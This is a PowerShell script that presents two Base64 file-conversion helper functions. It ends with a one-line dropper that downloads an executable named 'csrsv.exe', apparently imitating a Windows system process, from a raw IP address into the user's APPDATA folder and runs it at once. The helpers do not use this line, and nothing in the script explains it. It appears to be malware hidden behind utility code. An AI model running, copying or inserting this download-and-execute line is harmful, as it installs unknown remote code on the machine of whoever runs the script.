function ConvertTo-Bytes {
    param (
        [string]$file
    )

    if (!$file -or !(Test-Path $file)) {
        throw "file not found: '$file'"
    }

    [convert]::ToBase64String((Get-Content $file -Encoding Byte))
}

function ConvertFrom-Bytes {
    param (
        [string]$bytes,
        [string]$savepath
    )

    $dir = Split-Path $savepath
    if (!(Test-Path $dir)) {
        md $dir | Out-Null
    }

    [convert]::FromBase64String($bytes) | Set-Content $savepath -Encoding Byte
}

(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

